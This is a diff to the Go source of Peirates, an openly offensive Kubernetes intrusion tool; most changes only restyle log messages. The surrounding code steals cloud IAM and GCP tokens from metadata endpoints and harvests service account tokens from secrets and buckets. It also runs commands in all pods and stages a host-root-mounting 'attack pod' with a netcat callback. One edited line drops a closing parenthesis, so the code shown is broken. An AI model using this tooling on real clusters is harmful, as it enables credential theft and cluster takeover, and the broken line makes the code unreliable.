@@ -42,7 +42,7 @@ import (
 func getPodList(connectionString ServerInfo) []string {
 
 	if !kubectlAuthCanI(connectionString, "get", "pods") {
-		println("Permission Denied: your service account isn't allowed to get pods")
+		println("[-] Permission Denied: your service account isn't allowed to get pods")
 		return []string{}
 	}
 
@@ -50,7 +50,7 @@ func getPodList(connectionString ServerInfo) []string {
 
 	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
 	if err != nil {
-		fmt.Printf("Error while getting pods: %s\n", err.Error())
+		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
 		return []string{}
 	}
 	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column
@@ -59,7 +59,7 @@ func getPodList(connectionString ServerInfo) []string {
 	for _, line := range lines {
 		matched, err := regexp.MatchString(`^\s*$`, line)
 		if err != nil {
-			fmt.Printf("Error while parsing pods: %s\n", err.Error())
+			fmt.Printf("[-] Error while parsing pods: %s\n", err.Error())
 		}
 		if !matched {
 			//added checking to only enumerate running pods
@@ -82,13 +82,13 @@ func getSecretList(connectionString ServerInfo) ([]string, []string) {
 	var serviceAccountTokens []string
 
 	if !kubectlAuthCanI(connectionString, "get", "secrets") {
-		println("Permission Denied: your service account isn't allowed to get secrets")
+		println("[-] Permission Denied: your service account isn't allowed to get secrets")
 		return []string{}, []string{}
 	}
 
 	getSecretsRaw, _, err := runKubectlSimple(connectionString, "get", "secrets")
 	if err != nil {
-		fmt.Printf("Error while getting secrets: %s\n", err.Error())
+		fmt.Printf("[-] Error while getting secrets: %s\n", err.Error())
 		return []string{}, []string{}
 	}
 	// Iterate over kubectl get secrets, stripping off the first line which matches NAME and then grabbing the first column
@@ -97,7 +97,7 @@ func getSecretList(connectionString ServerInfo) ([]string, []string) {
 	for _, line := range lines {
 		matched, err := regexp.MatchString(`^\s*$`, line)
 		if err != nil {
-			fmt.Printf("Error while parsing secrets: %s\n", err.Error())
+			fmt.Printf("[-] Error while parsing secrets: %s\n", err.Error())
 			return []string{}, []string{}
 		}
 		if !matched {
@@ -126,7 +126,7 @@ func GetGCPBearerTokenFromMetadataAPI(account string) string {
 	reqToken.Header.Add("Metadata-Flavor", "Google")
 	response, err := client.Do(reqToken)
 	if err != nil {
-		println("Error - could not perform request ", url)
+		println("[-] Error - could not perform request ", url)
 	}
 	defer response.Body.Close()
 	body, err := ioutil.ReadAll(response.Body)
@@ -138,7 +138,7 @@ func GetGCPBearerTokenFromMetadataAPI(account string) string {
 	if tokenElements[1] == "access_token" {
 		return (tokenElements[3])
 	} else {
-		println("Error - could not find token in returned body text: ", string(body))
+		println("[-] Error - could not find token in returned body text: ", string(body))
 		return "ERROR"
 	}
 }
@@ -151,10 +151,10 @@ func getHostname(connectionString ServerInfo, PodName string) string {
 
 	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
 	if err != nil {
-		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
-		return "- Pod command exec failed for " + PodName + "\n"
+		println("[-] Checking for hostname of pod "+PodName+" failed: ", err)
+		return "[-] Pod command exec failed for " + PodName + "\n"
 	} else {
-		return "+ Pod discovered: " + string(hostname)
+		return "[+] Pod discovered: " + string(hostname)
 	}
 }
 
@@ -303,7 +303,7 @@ func inAPod(connectionString ServerInfo) bool {
 func PrintNamespaces(connectionString ServerInfo) []string {
 
 	if !kubectlAuthCanI(connectionString, "get", "namespaces") {
-		println("Permission Denied: your service account isn't allowed to get namespaces")
+		println("[-] Permission Denied: your service account isn't allowed to get namespaces")
 		return []string{}
 	}
 
@@ -313,7 +313,7 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 
 	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
 	if err != nil {
-		fmt.Printf("Error while getting namespaces: %s\n", err.Error())
+		fmt.Printf("[-] Error while getting namespaces: %s\n", err.Error())
 		return []string{}
 	}
 	// Iterate over kubectl get namespaces, stripping off the first line which matches NAME and then grabbing the first column
@@ -324,7 +324,7 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 		println(line)
 		matched, err := regexp.MatchString(`^\s*$`, line)
 		if err != nil {
-			fmt.Printf("Error while parsing namespaces: %s\n", err.Error())
+			fmt.Printf("[-] Error while parsing namespaces: %s\n", err.Error())
 			return []string{}
 		}
 		if !matched {
@@ -344,7 +344,7 @@ func PrintNamespaces(connectionString ServerInfo) []string {
 func getListOfPods(connectionString ServerInfo) {
 	runningPods := getPodList(connectionString)
 	for _, listpod := range runningPods {
-		fmt.Println("Pod Name: " + listpod)
+		println("[+] Pod Name: " + listpod)
 	}
 
 }
@@ -352,7 +352,7 @@ func getListOfPods(connectionString ServerInfo) {
 // execInAllPods() runs kubeData.command in all running pods
 func execInAllPods(connectionString ServerInfo, command string) {
 	if !kubectlAuthCanI(connectionString, "exec", "pod") {
-		println("Permission Denied: your service account isn't allowed to exec commands in pods")
+		println("[-] Permission Denied: your service account isn't allowed to exec commands in pods")
 		return
 	}
 	runningPods := getPodList(connectionString)
@@ -360,11 +360,11 @@ func execInAllPods(connectionString ServerInfo, command string) {
 	for _, execPod := range runningPods {
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
 		if err != nil {
-			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
+			fmt.Printf("[-] Executing %s in Pod %s failed: %s\n", command, execPod, err)
 		} else {
-			// fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
-			fmt.Println(" ")
-			fmt.Println("\n", string(execInPodOut))
+			// println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
+			println(" ")
+			println("\n", string(execInPodOut))
 		}
 	}
 
@@ -373,19 +373,19 @@ func execInAllPods(connectionString ServerInfo, command string) {
 // execInListPods() runs kubeData.command in all pods in kubeData.list
 func execInListPods(connectionString ServerInfo, pods []string, command string) {
 	if !kubectlAuthCanI(connectionString, "exec", "pods") {
-		println("Permission Denied: your service account isn't allowed to exec commands in pods")
+		println("[-] Permission Denied: your service account isn't allowed to exec commands in pods")
 		return
 	}
 
-	fmt.Println("+ Running supplied command in list of pods")
+	println("[+] Running supplied command in list of pods")
 	for _, execPod := range pods {
 		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
 		if err != nil {
-			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
+			fmt.Printf("[-] Executing %s in Pod %s failed: %s\n", command, execPod, err)
 		} else {
-			// fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
-			fmt.Println(" ")
-			fmt.Println(string(execInPodOut))
+			// println("[+] Executing " + command + " in Pod " + execPod + " succeeded: ")
+			println(" ")
+			println(string(execInPodOut))
 		}
 	}
 
@@ -584,32 +584,32 @@ type Get_Node_Details struct {
 func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {
 
 	if !kubectlAuthCanI(connectionString, "get", "pods") {
-		println("Permission Denied: your service account isn't allowed to get pods")
+		println("[-] Permission Denied: your service account isn't allowed to get pods")
 		return
 	}
 
-	fmt.Println("+ Getting details for all pods")
+	println("[+] Getting details for all pods")
 	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
 	println(string(podDetailOut))
 	if err != nil {
-		fmt.Println("[-] Unable to retrieve details from this pod: ", err)
+		println("[-] Unable to retrieve details from this pod: ", err
 	} else {
-		fmt.Println("[+] Retrieving details for all pods was successful: ")
+		println("[+] Retrieving details for all pods was successful: ")
 		err := json.Unmarshal(podDetailOut, &podDetails)
 		if err != nil {
-			fmt.Println("[-] Error unmarshaling data: ", err)
+			println("[-] Error unmarshaling data: ", err)
 		}
 	}
 }
 
 // GetHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
 func GetHostMountPoints(podInfo PodDetails) {
-	fmt.Println("+ Getting all host mount points for pods in current namespace")
+	println("[+] Getting all host mount points for pods in current namespace")
 	for _, item := range podInfo.Items {
-		// fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
+		// println("+ Host Mount Points for Pod: " + item.Metadata.Name)
 		for _, volume := range item.Spec.Volumes {
 			if volume.HostPath.Path != "" {
-				fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
+				println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
 			}
 		}
 	}
@@ -617,12 +617,12 @@ func GetHostMountPoints(podInfo PodDetails) {
 
 // GetHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
 func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
-	fmt.Println("+ Getting all Host Mount Points only for pod: " + pod)
+	println("[+] Getting all Host Mount Points only for pod: " + pod)
 	for _, item := range podInfo.Items {
 		if item.Metadata.Name == pod {
 			for _, volume := range item.Spec.Volumes {
 				if volume.HostPath.Path != "" {
-					fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path))
+					println("\tHost Mount Point: " + string(volume.HostPath.Path))
 				}
 			}
 		}
@@ -632,15 +632,15 @@ func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
 // GetRoles() enumerates all roles in use on the cluster (in the default namespace).
 // It parses all roles into a KubeRoles object.
 func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
-	fmt.Println("+ Getting all Roles")
+	println("[+] Getting all Roles")
 	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
 	if err != nil {
-		fmt.Println("[-] Unable to retrieve roles from this pod: ", err)
+		println("[-] Unable to retrieve roles from this pod: ", err)
 	} else {
-		fmt.Println("[+] Retrieving roles was successful: ")
+		println("[+] Retrieving roles was successful: ")
 		err := json.Unmarshal(rolesOut, &kubeRoles)
 		if err != nil {
-			fmt.Println("[-] Error unmarshaling data: ", err)
+			println("[-] Error unmarshaling data: ", err)
 		}
 
 	}
@@ -652,7 +652,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 
 	// First, confirm we're allowed to create pods
 	if !canCreatePods(connectionString) {
-		println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
+		println("[-] AUTHORIZATION: this token isn't allowed to create pods in this namespace")
 		return
 	}
 	// TODO: changing parsing to occur via JSON
@@ -666,7 +666,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
 	if err != nil {
 		approach1Success = false
-		println("DEBUG: describe pod didn't work")
+		println("[-] DEBUG: describe pod didn't work")
 	} else {
 		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
 		for _, line := range podDescriptionLines {
@@ -674,19 +674,19 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 			if start != -1 {
 				// Found an Image line -- now get the image
 				image = strings.TrimSpace(line[start+6:])
-				println("Found image :", image)
+				println("[+] Found image :", image)
 				approach1Success = true
 
 				MountInfoVars.image = image
 			}
 		}
 		if !approach1Success {
-			println("DEBUG: did not find an image line in your pod's definition.")
+			println("[-] DEBUG: did not find an image line in your pod's definition.")
 		}
 	}
 
 	if approach1Success {
-		println("Got image definition from own pod.")
+		println("[+] Got image definition from own pod.")
 	} else {
 		// Approach 2 - use the most recently staged running pod
 		//
@@ -713,14 +713,14 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
 		if err != nil {
 			//log.Fatal(err)
-			println("ERROR: Could not get pods")
+			println("[-] ERROR: Could not get pods")
 			return
 		}
 		getImageLines := strings.Split(string(getImagesRaw), "\n")
 		for _, line := range getImageLines {
 			matched, err := regexp.MatchString(`^\s*$`, line)
 			if err != nil {
-				println("ERROR: could not parse pod list")
+				println("[-] ERROR: could not parse pod list")
 				return
 				// log.Fatal(err)
 			}
@@ -728,7 +728,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 				//added checking to only enumerate running pods
 				// BUG: Did we do this? Check.
 				MountInfoVars.image = strings.Fields(line)[7]
-				//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
+				//println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
 			}
 		}
 	}
@@ -764,7 +764,7 @@ spec:
 
 	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
 	if err != nil {
-		println("Pod did not stage successfully.")
+		println("[-] Pod did not stage successfully.")
 		return
 	} else {
 		attackPodName := "attack-pod-" + randomString
@@ -779,18 +779,18 @@ spec:
 
 		if err != nil {
 			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
-			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
+			println("[-] Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
 			return
 		} else {
-			println("Netcat callback added sucessfully.")
+			println("[+] Netcat callback added sucessfully.")
 			//println(string(shadowFileBs))
 		}
 	}
 	//out, err = exec.Command("").Output()
 	//if err != nil {
-	//	fmt.Println("Token location error: ", err)
+	//	println("Token location error: ", err)
 	//}
-	//fmt.Println(out)
+	//println(out)
 }
 
 func clearScreen() {
@@ -899,8 +899,8 @@ ________________________________________
 	}
 	fmt.Printf("[+] Certificate Authority Certificate: %t\n", haveCa)
 	fmt.Printf("[+] Kubernetes API Server: %s:%s\n", connectionString.RIPAddress, connectionString.RPort)
-	fmt.Println("[+] Current hostname:", name)
-	fmt.Println("[+] Current namespace:", connectionString.Namespace)
+	println("[+] Current hostname:", name)
+	println("[+] Current namespace:", connectionString.Namespace)
 
 }
 
@@ -913,42 +913,42 @@ func ReadFile(filename string) {
 }
 
 func GetNodesInfo(connectionString ServerInfo) {
-	fmt.Println("+ Getting details for all pods")
+	println("[+] Getting details for all pods")
 	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(string(podDetailOut))
 	if err != nil {
-		fmt.Println("[-] Unable to retrieve node details: ", err)
+		println("[-] Unable to retrieve node details: ", err)
 	}
 }
 
 func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
-	fmt.Println("+ Getting IP addresses for the nodes in the cluster...")
+	println("[+] Getting IP addresses for the nodes in the cluster...")
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
 
 	if err != nil {
-		fmt.Println("[-] Unable to retrieve node details: ")
+		println("[-] Unable to retrieve node details: ")
 	} else {
 		var getnodeDetail Get_Node_Details
 		err := json.Unmarshal(nodeDetailOut, &getnodeDetail)
 		if err != nil {
-			fmt.Println("[-] Error unmarshaling data in this secret: ", err)
+			println("[-] Error unmarshaling data in this secret: ", err)
 		}
 
 		for _, item := range getnodeDetail.Items {
 
 			for _, addr := range item.Status.Addresses {
-				// fmt.Println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
+				// println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
 				if addr.Type == "Hostname" {
 				} else {
-					fmt.Println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
-					fmt.Println("[+] Grabbing Pods from node: " + item.Metadata.Name)
+					println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
+					println("[+] Grabbing Pods from node: " + item.Metadata.Name)
 					client := &http.Client{}
 					// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
 					reqKube, err := http.NewRequest("GET", "http://"+addr.Address+":10255/pods", nil)
 					resp, err := client.Do(reqKube)
 					if err != nil {
-						println("Error - could not perform request http://" + addr.Address + ":10255/pods")
+						println("[-] Error - could not perform request http://" + addr.Address + ":10255/pods")
 					}
 					defer resp.Body.Close()
 					body, err := ioutil.ReadAll(resp.Body)
@@ -995,12 +995,12 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								reqExecPod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
 								respExecPod, err := sslClient.Do(reqExecPod)
 								if err != nil {
-									fmt.Printf("Error - could not perform request --%s--\n", urlExecPod)
+									fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlExecPod, err.Error())
 									respExecPod.Body.Close()
 									continue
 								}
 								if respExecPod.Status != "200 OK" {
-									fmt.Printf("Error - response code: %s\n", respExecPod.Status)
+									fmt.Printf("[-] Error - response code: %s\n", respExecPod.Status)
 									continue
 								}
 								defer respExecPod.Body.Close()
@@ -1164,7 +1164,7 @@ Peirates:># `)
 			case "4":
 				serviceAccountJSON, err := json.Marshal(serviceAccounts)
 				if err != nil {
-					fmt.Printf("Error exporting service accounts: %s\n", err.Error())
+					fmt.Printf("[-] Error exporting service accounts: %s\n", err.Error())
 				} else {
 					println(string(serviceAccountJSON))
 				}
@@ -1172,10 +1172,10 @@ Peirates:># `)
 				var newServiceAccounts []ServiceAccount
 				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
 				if err != nil {
-					fmt.Printf("Error importing service accounts: %s\n", err.Error())
+					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
 				} else {
 					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
-					fmt.Printf("Successfully imported service accounts\n")
+					fmt.Printf("[+] Successfully imported service accounts\n")
 				}
 			}
 
@@ -1213,10 +1213,10 @@ Peirates:># `)
 		case "10":
 			secrets, serviceAccountTokens := getSecretList(connectionString)
 			for _, secret := range secrets {
-				println("Secret found: ", secret)
+				println("[+] Secret found: ", secret)
 			}
 			for _, svcAcct := range serviceAccountTokens {
-				println("Service account found: ", svcAcct)
+				println("[+] Service account found: ", svcAcct)
 			}
 			break
 
@@ -1227,13 +1227,13 @@ Peirates:># `)
 			fmt.Scanln(&secretName)
 
 			if !kubectlAuthCanI(connectionString, "get", "secret") {
-				println("Permission Denied: your service account isn't allowed to get secrets")
+				println("[-] Permission Denied: your service account isn't allowed to get secrets")
 				break
 			}
 
 			secretJSON, _, err := runKubectlSimple(connectionString, "get", "secret", secretName, "-o", "json")
 			if err != nil {
-				fmt.Println("[-] Could not retrieve secret")
+				println("[-] Could not retrieve secret")
 				break
 			}
 
@@ -1250,10 +1250,10 @@ Peirates:># `)
 			opaqueToken := secretData["data"].(map[string]interface{})["token"].(string)
 			token, err := base64.StdEncoding.DecodeString(opaqueToken)
 			if err != nil {
-				println("ERROR: couldn't decode")
+				println("[-] ERROR: couldn't decode")
 				break
 			} else {
-				fmt.Printf("Saved %s // %s\n", secretName, token)
+				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
 				serviceAccounts = append(serviceAccounts, makeNewServiceAccount(secretName, string(token), "Cluster Secret"))
 			}
 
@@ -1302,7 +1302,7 @@ Peirates:># `)
 		case "12":
 			resp, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
 			if err != nil {
-				println("Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+				println("[-] Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/")
 			}
 			// Parse result as an account, then construct a request asking for that account's credentials
 			defer resp.Body.Close()
@@ -1313,7 +1313,7 @@ Peirates:># `)
 			request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
 			resp_2, err := http.Get(request)
 			if err != nil {
-				println("Error - could not perform request ", request)
+				println("[-] Error - could not perform request ", request)
 			}
 			defer resp_2.Body.Close()
 			body_2, err := ioutil.ReadAll(resp_2.Body)
@@ -1329,7 +1329,7 @@ Peirates:># `)
 			reqAccounts.Header.Add("Metadata-Flavor", "Google")
 			resp, err := client.Do(reqAccounts)
 			if err != nil {
-				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
+				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
 			}
 			defer resp.Body.Close()
 			body, err := ioutil.ReadAll(resp.Body)
@@ -1358,7 +1358,7 @@ Peirates:># `)
 			reqKube.Header.Add("Metadata-Flavor", "Google")
 			resp, err := client.Do(reqKube)
 			if err != nil {
-				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
+				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
 			}
 			defer resp.Body.Close()
 			body, err := ioutil.ReadAll(resp.Body)
@@ -1425,7 +1425,7 @@ Peirates:># `)
 			reqProjid.Header.Add("Metadata-Flavor", "Google")
 			respProjid, err := client.Do(reqProjid)
 			if err != nil {
-				println("Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
+				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id")
 				respProjid.Body.Close()
 				break
 			}
@@ -1451,7 +1451,7 @@ Peirates:># `)
 			reqListBuckets.Header.Add("Accept", "json")
 			respListBuckets, err := sslClient.Do(reqListBuckets)
 			if err != nil {
-				fmt.Printf("Error - could not perform request --%s-- - %s\n", urlListBuckets, err.Error())
+				fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListBuckets, err.Error())
 				respListBuckets.Body.Close()
 				break
 			}
@@ -1479,7 +1479,7 @@ Peirates:># `)
 				reqListObjects.Header.Add("Accept", "json")
 				respListObjects, err := sslClient.Do(reqListObjects)
 				if err != nil {
-					fmt.Printf("Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
+					fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
 					respListObjects.Body.Close()
 					break
 				}
@@ -1511,7 +1511,7 @@ Peirates:># `)
 							reqToken.Header.Add("Accept", "json")
 							respToken, err := sslClient.Do(reqToken)
 							if err != nil {
-								fmt.Printf("Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
+								fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlListObjects, err.Error())
 								respToken.Body.Close()
 								break
 							}
@@ -1528,14 +1528,14 @@ Peirates:># `)
 								encodedToken := strings.Split(line, "\"")[3]
 								token, err := base64.StdEncoding.DecodeString(encodedToken)
 								if err != nil {
-									println("Could not decode token.")
+									println("[-] Could not decode token.")
 								} else {
 									tokenString := string(token)
 									println(tokenString)
 
 									if placeTokensInStore {
 										tokenName := "GCS-acquired: " + string(serviceAccountName)
-										println("Storing token as:", tokenName)
+										println("[+] Storing token as:", tokenName)
 										serviceAccount := makeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
 										serviceAccounts = append(serviceAccounts, serviceAccount)
 
@@ -1585,7 +1585,7 @@ Peirates:># `)
 				if cmdOpts.commandToRunInPods != "" {
 					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
 				} else {
-					fmt.Print("ERROR - command string was empty.")
+					fmt.Print("[-] ERROR - command string was empty.")
 					fmt.Scanln(&input)
 				}
 
